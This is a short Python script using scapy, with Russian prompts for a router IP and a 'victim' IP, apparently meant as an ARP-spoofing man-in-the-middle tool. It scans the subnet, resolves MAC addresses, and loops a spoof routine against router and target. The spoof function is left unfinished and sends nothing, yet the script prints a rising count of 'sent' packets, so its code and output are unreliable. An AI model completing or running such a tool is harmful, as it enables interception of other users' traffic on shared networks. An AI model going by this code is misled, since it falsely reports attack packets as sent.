import scapy.all as scapy 
import time 
 
 
route = input('Введите ip адрес роутера (прим: X.X.X.X): ') 
 
while True: 
    print(scapy.arping(route+'/24')) 
    target = input('Введите ip адрес жертвы (прим: X.X.X.X): ') 
    if target == '' or target == ' ': 
        continue 
    else: 
        break 
 
 
def get_mac(ip): 
    arp_request = scapy.ARP(pdst=ip) 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast/arp_request  
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] 
    return answered_list[0] [1].hwsrc
 
 
def spoof(target_ip, spoof_ip): 
    target_mac = get_mac(target_ip) 
 
 
sent_pakets_count = 0 
try: 
    while True: 
        spoof(route, target) 
        spoof(target, route) 
        sent_pakets_count = sent_pakets_count + 2 
        print ("\r[+] Paket sent: " + str(sent_pakets_count), end="") 
        time.sleep(2) 
except KeyboardInterrupt: 
    print("\n[+] Detected CTRL + C ...... Quitting.")
